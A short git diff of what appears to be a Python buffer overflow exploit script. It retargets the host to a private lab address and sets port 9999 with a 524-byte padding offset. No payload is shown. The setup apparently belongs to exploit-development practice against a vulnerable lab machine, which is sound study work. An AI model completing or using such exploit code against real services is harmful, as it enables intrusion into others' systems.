@@ -2,7 +2,7 @@ import socket
 import sys
 from termcolor import colored
 
-HOST = "192.168.0.6"
+HOST = "192.168.56.101"
 PORT = 9999 
 
 offset = b"A" * 524
